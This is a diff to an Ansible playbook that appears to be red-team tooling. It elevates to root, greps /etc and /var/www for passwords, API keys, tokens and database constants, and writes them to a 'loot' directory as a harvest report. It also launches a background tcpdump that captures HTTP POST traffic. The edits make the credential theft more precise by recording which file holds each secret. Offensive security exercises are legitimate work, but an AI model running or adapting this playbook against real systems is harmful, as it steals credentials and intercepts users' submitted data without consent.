@@ -2,10 +2,11 @@
 - name: Targeted Secret Extraction
   become: yes
   shell: |
-    # Matches patterns like pass=val or password:val
-    # grep -vE removes the system library junk (unmount, update, etc.)
-    grep -rEho "(password|passwd|db_pass|api_key|token|secret)\s*[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /etc /var/www 2>/dev/null \
-    | grep -vE "(undefined|update|unmount|unit|url|use|validate|unconf|uncert|unselect|unserialize)" \
+    # Removed -h to show filenames. 
+    # Added /etc /var/www to scope.
+    # Added a second grep -vE to filter out more common false positives.
+    grep -rEo "(password|passwd|db_pass|api_key|token|secret)\s*[:=]\s*['\"]?[^'\" \t\n;]{4,30}['\"]?" /etc /var/www 2>/dev/null \
+    | grep -vE "(undefined|update|unmount|unit|url|use|validate|unconf|uncert|unselect|unserialize|worker|options|msg|Label|icon|color)" \
     | sort -u
   register: config_secrets
   failed_when: false
@@ -14,8 +15,8 @@
 - name: Web and Database Constant Extraction
   become: yes
   shell: |
-    # Targets PHP define statements and cleans the output: DB_PASS = value
-    grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
+    # Removed -h to show which config file contains the DB credentials
+    grep -rEo "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
     | sed "s/['\"],/ = /g" | tr -d "()',\""
   register: web_secrets
   failed_when: false
@@ -26,9 +27,11 @@
   copy:
     content: |
       === HARVEST REPORT: {{ inventory_hostname }} ===
-      [CONFIG SECRETS]
+      
+      [FILE PATH : MATCHED SECRET]
       {{ config_secrets.stdout if config_secrets.stdout != "" else "None" }}
-      [WEB CONSTANTS]
+
+      [DATABASE CONSTANTS]
       {{ web_secrets.stdout if web_secrets.stdout != "" else "None" }}
     dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/harvest_results.txt"
   become: no
@@ -37,6 +40,8 @@
 - name: LIVE CREDS ALERT
   debug:
     msg: 
+      - "File Location : Found Secret"
+      - "---------------------------"
       - "Configs: {{ config_secrets.stdout_lines | default(['None']) }}"
       - "Web/DB: {{ web_secrets.stdout_lines | default(['None']) }}"
   when: config_secrets.stdout != "" or web_secrets.stdout != ""
@@ -44,7 +49,6 @@
 - name: Start Background Network Sniffer
   delegate_to: localhost
   shell: |
-    # Ensure ens8 matches the Red Workstation interface (check 'ip a')
     nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
   run_once: true
   become: yes
